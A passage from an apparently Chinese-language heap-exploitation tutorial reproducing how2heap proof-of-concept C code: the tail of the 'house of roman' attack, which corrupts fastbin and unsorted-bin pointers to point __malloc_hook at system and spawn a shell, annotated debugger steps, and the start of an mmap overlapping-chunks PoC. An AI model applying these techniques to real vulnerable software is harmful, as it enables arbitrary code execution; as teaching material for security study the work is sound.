</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Now, we have a fastbin that looks like the following: </span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	We want the fd ptr in fake_libc_chunk to point to something useful. </span></span><br><span class="line"><span class="comment">	So, let&#x27;s edit this to point to the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	This way, we can get control of a function ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	To do this, we need a valid malloc size. Within the __memalign_hook </span></span><br><span class="line"><span class="comment">	is usually an address that usually starts with 0x7f. </span></span><br><span class="line"><span class="comment">	Because __memalign_hook value is right before this are all 0s, </span></span><br><span class="line"><span class="comment">	we could use a misaligned chunk to get this to work as a valid size in </span></span><br><span class="line"><span class="comment">	the 0x70 fastbin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This is where the first 4 bits of randomness come into play. </span></span><br><span class="line"><span class="comment">	The first 12 bits of the LibC address are deterministic for the address. </span></span><br><span class="line"><span class="comment">	However, the next 4 (for a total of 2 bytes) are not. </span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	So, we have to brute force 2^4 different possibilities (16) </span></span><br><span class="line"><span class="comment">	in order to get this in the correct location. This &#x27;location&#x27; </span></span><br><span class="line"><span class="comment">	is different for each version of GLibC (should be noted).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After doing this relative overwrite, the fastbin looks like the following:</span></span><br><span class="line"><span class="comment">			0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (__malloc_hook - 0x23).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Relatively overwrite the main_arena pointer to point to a valid </span></span><br><span class="line"><span class="comment">	chunk close to __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// <span class="doctag">NOTE:</span> In order to make this exploit consistent </span></span><br><span class="line"><span class="comment">	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In the actual attack, this values would need to be specific </span></span><br><span class="line"><span class="comment">	to a version and some of the bits would have to be brute forced </span></span><br><span class="line"><span class="comment">	(depending on the bits).</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Use a relative overwrite on the main_arena pointer in the fastbin.\n\</span></span><br><span class="line"><span class="string">Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> __malloc_hook_adjust = __malloc_hook - <span class="number">0x23</span>; <span class="comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The relative overwrite</span></span><br><span class="line">	<span class="type">int8_t</span> byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	<span class="type">int8_t</span> byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line">	fake_libc_chunk[<span class="number">0</span>] = byte1; <span class="comment">// Least significant bytes of the address.</span></span><br><span class="line">	fake_libc_chunk[<span class="number">1</span>] = byte2; <span class="comment">// The upper most 4 bits of this must be brute forced in a real attack.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span></span><br><span class="line">	<span class="comment">// These are fastbin_victim and fake_libc_chunk.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">In a real exploit, this would fail 15/16 times\n\</span></span><br><span class="line"><span class="string">because of the final half byet of the malloc_hook being random\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the 4 bit brute force did not work, this will crash because </span></span><br><span class="line">	<span class="comment">// of the chunk size not matching the bin for the chunk. </span></span><br><span class="line">	<span class="comment">// Otherwise, the next step of the attack can begin.</span></span><br><span class="line">	<span class="type">uint8_t</span>* malloc_hook_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 1 =)\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Part 2: Unsorted_bin attack </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, we have control over the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">	However, we do not know the address of LibC still. So, we cannot </span></span><br><span class="line"><span class="comment">	do much with this attack. In order to pop a shell, we need </span></span><br><span class="line"><span class="comment">	to get an address at the location of the __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We will use the unsorted_bin attack in order to change the value </span></span><br><span class="line"><span class="comment">	of the __malloc_hook with the address of main_arena + 0x68. </span></span><br><span class="line"><span class="comment">	For more information on the unsorted_bin attack, review </span></span><br><span class="line"><span class="comment">	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For a brief overview, the unsorted_bin attack allows us to write</span></span><br><span class="line"><span class="comment">	main_arena + 0x68 to any location by altering the chunk-&gt;bk of</span></span><br><span class="line"><span class="comment">	an unsorted_bin chunk. We will choose to write this to the </span></span><br><span class="line"><span class="comment">	location of __malloc_hook.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After we overwrite __malloc_hook with the main_arena, we will </span></span><br><span class="line"><span class="comment">	edit the pointer (with a relative overwrite) to point to a </span></span><br><span class="line"><span class="comment">	one_gadget for immediate code execution.</span></span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">	Again, this relative overwrite works well but requires an additional </span></span><br><span class="line"><span class="comment">	1 byte (8 bits) of brute force.</span></span><br><span class="line"><span class="comment">	This brings the chances of a successful attempt up to 12 bits of </span></span><br><span class="line"><span class="comment">	randomness. This has about a 1/4096 or a 0.0244% chance of working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The steps for phase two of the attack are explained as we go below.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Start Step 2: Unsorted_bin attack\n\n\</span></span><br><span class="line"><span class="string">The unsorted bin attack gives us the ability to write a\n\</span></span><br><span class="line"><span class="string">large value to ANY location. But, we do not control the value\n\</span></span><br><span class="line"><span class="string">This value is always main_arena + 0x68. \n\</span></span><br><span class="line"><span class="string">We point the unsorted_bin attack to __malloc_hook for a \n\</span></span><br><span class="line"><span class="string">relative overwrite later.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">uint8_t</span>* unsorted_bin_ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// Don&#x27;t want to consolidate</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put chunk into unsorted_bin\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Free the chunk to create the UAF</span></span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* /// <span class="doctag">NOTE:</span> The last 4 bits of byte2 would have been brute forced earlier. \\\ </span></span><br><span class="line"><span class="comment">	 However, for the sake of example, this has been calculated dynamically. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	__malloc_hook_adjust = __malloc_hook - <span class="number">0x10</span>; <span class="comment">// This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.</span></span><br><span class="line">	byte1 = (__malloc_hook_adjust) &amp; <span class="number">0xff</span>; 	</span><br><span class="line">	byte2 = (__malloc_hook_adjust &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.</span></span><br><span class="line">	<span class="comment">// From the previous brute force (4 bits from before) we </span></span><br><span class="line">	<span class="comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;</span>);</span><br><span class="line">	unsorted_bin_ptr[<span class="number">8</span>] = byte1; <span class="comment">// Byte 0 of bk. 	</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //// <span class="doctag">NOTE:</span> Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span></span><br><span class="line">	unsorted_bin_ptr[<span class="number">9</span>] = byte2; <span class="comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Trigger the unsorted bin attack.</span></span><br><span class="line"><span class="comment">	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	A few things do happen though: </span></span><br><span class="line"><span class="comment">		- This makes the unsorted bin (hence, small and large too) </span></span><br><span class="line"><span class="comment">		   unusable. So, only allocations previously in the fastbin can only be used now.</span></span><br><span class="line"><span class="comment">		- If the same size chunk (the unsorted_bin attack chunk) </span></span><br><span class="line"><span class="comment">		   is NOT malloc&#x27;ed, the program will crash immediately afterwards. </span></span><br><span class="line"><span class="comment">		   So, the allocation request must be the same as the unsorted_bin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The first point is totally fine (in this attack). But, in more complicated </span></span><br><span class="line"><span class="comment">	programming, this can be an issue.</span></span><br><span class="line"><span class="comment">	The second just requires us to do the same size allocaton as the current chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Trigger the unsorted_bin attack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> system_addr = (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">dlsym</span>(RTLD_NEXT, <span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Passed step 2 =)\n\n\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Step 3: Set __malloc_hook to system</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	The chunk itself is allocated 19 bytes away from __malloc_hook. </span></span><br><span class="line"><span class="comment">	So, we use a realtive overwrite (again) in order to partially overwrite </span></span><br><span class="line"><span class="comment">	the main_arena pointer (from unsorted_bin attack) to point to system.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In a real attack, the first 12 bits are static (per version). </span></span><br><span class="line"><span class="comment">	But, after that, the next 12 bits must be brute forced. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	/// <span class="doctag">NOTE:</span> For the sake of example, we will be setting these values, instead of brute forcing them. \\\</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 3: Set __malloc_hook to system/one_gadget\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n&quot;</span>);</span><br><span class="line">	malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">	malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span></span><br><span class="line">	<span class="comment">// In a real example, you would probably want to use a one_gadget. </span></span><br><span class="line">	<span class="comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span></span><br><span class="line">	<span class="comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span></span><br><span class="line">	<span class="comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-16"><a href="#调试-16" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204026160.png"
                      alt="image-20231013204026160"
                ></p>
<p>部署如上 <code>chunk</code>，从上到下分别为 <code>fastbin_victim</code> ，<code>obstruct</code>，<code>main_arena_use</code>，<code>relative_offset_heap</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204454716.png"
                      alt="image-20231013204454716"
                ></p>
<p>将 <code>main_arena_use</code> 放进 <code>unsorted_bin</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204656108.png"
                      alt="image-20231013204656108"
                ></p>
<p>再次申请 <code>0x70</code> 大小的 <code>chunk: fake_libc_chunk</code> ，拆分 <code>main_arena_use</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205315619.png"
                      alt="image-20231013205315619"
                ></p>
<p>利用 <code>fake_libc_chunk</code> 中保存的 <code>libc</code> 地址和固定偏移 <code>glibc_2.23为0xe8（每个版本基本都不同）</code> 计算出 <code>__malloc_hook</code> 地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205510025.png"
                      alt="image-20231013205510025"
                ></p>
<p>依次释放 <code>relative_offset_heap</code>，<code>fastbin_victim</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210049926.png"
                      alt="image-20231013210049926"
                ></p>
<p>将 <code>fastbin_victim</code> 的 <code>fd</code> 指针的末尾两位改为 <code>0</code>，那么将会把 <code>fake_libc_chunk</code> 链接进 <code>fastbinY[5](0x70)</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210254989.png"
                      alt="image-20231013210254989"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210849688.png"
                      alt="image-20231013210849688"
                ></p>
<p><code>glibc_2.23</code> 版本在 <code>__malloc_hook-0x23</code> 处存在 <code>0x7f</code> 大小的 <code>fake_fast</code> ，我们将 <code>fake_libc_chunk</code> 的 <code>fd</code> 指针指向 <code>fake_fast_malloc_hook</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211147427.png"
                      alt="image-20231013211147427"
                ></p>
<p>申请 <code>3</code> 次 <code>0x70</code> 大小的 <code>chunk</code>，可以将 <code>fake_fast_malloc_hook</code> 申请出来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211909572.png"
                      alt="image-20231013211909572"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211951560.png"
                      alt="image-20231013211951560"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212024266.png"
                      alt="image-20231013212024266"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212227267.png"
                      alt="image-20231013212227267"
                ></p>
<p>因为 <code>__malloc_hook</code> 和 <code>system</code> 的地址差异较大，需要更改的字节较多，所以我们通过 <code>unsorted_bin attack(前文有介绍，不再赘述)</code> 将其改为 <code>main_arena + 0x58</code> 处的地址，再将其改为 <code>system</code> 地址即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212506159.png"
                      alt="image-20231013212506159"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212722616.png"
                      alt="image-20231013212722616"
                ></p>
<p>从 <code>19(0x13，也就是 0x23-0x8_fd-0x8_bk)</code> 处开始按字节写入后 <code>system</code> 几位地址 ，再去 <code>&quot;malloc(&quot;/bin/sh\x00&quot;)&quot;</code> 即可 <code>getshell</code> 。</p>
<h2 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Technique should work on all versions of GLibC</span></span><br><span class="line"><span class="comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	A primer on Mmap chunks in GLibC</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	In GLibC, there is a point where an allocation is so large that malloc</span></span><br><span class="line"><span class="comment">	decides that we need a seperate section of memory for it, instead </span></span><br><span class="line"><span class="comment">	of allocating it on the normal heap. This is determined by the mmap_threshold var.</span></span><br><span class="line"><span class="comment">	Instead of the normal logic for getting a chunk, the system call *Mmap* is </span></span><br><span class="line"><span class="comment">	used. This allocates a section of virtual memory and gives it back to the user. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Similarly, the freeing process is going to be different. Instead </span></span><br><span class="line"><span class="comment">	of a free chunk being given back to a bin or to the rest of the heap,</span></span><br><span class="line"><span class="comment">	another syscall is used: *Munmap*. This takes in a pointer of a previously </span></span><br><span class="line"><span class="comment">	allocated Mmap chunk and releases it back to the kernel. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have special bit set on the size metadata: the second bit. If this </span></span><br><span class="line"><span class="comment">	bit is set, then the chunk was allocated as an Mmap chunk. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have a prev_size and a size. The *size* represents the current </span></span><br><span class="line"><span class="comment">	size of the chunk. The *prev_size* of a chunk represents the left over space</span></span><br><span class="line"><span class="comment">	from the size of the Mmap chunk (not the chunks directly belows size). </span></span><br><span class="line"><span class="comment">	However, the fd and bk pointers are not used, as Mmap chunks do not go back </span></span><br><span class="line"><span class="comment">	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span></span><br><span class="line"><span class="comment">	the chunk must be page-aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The POC below is essentially an overlapping chunk attack but on mmap chunks. </span></span><br><span class="line"><span class="comment">	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span></span><br><span class="line"><span class="comment">	The main difference is that mmapped chunks have special properties and are </span></span><br><span class="line"><span class="comment">	handled in different ways, creating different attack scenarios than normal </span></span><br><span class="line"><span class="comment">	overlapping chunk attacks. There are other things that can be done, </span></span><br><span class="line"><span class="comment">	such as munmapping system libraries, the heap itself and other things.</span></span><br><span class="line"><span class="comment">	This is meant to be a simple proof of concept to demonstrate the general </span></span><br><span class="line"><span class="comment">	way to perform an attack on an mmap chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For more information on mmap chunks in GLibC, read this post: </span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=======================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCurrent System Memory Layout \n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line">			<span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">			);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	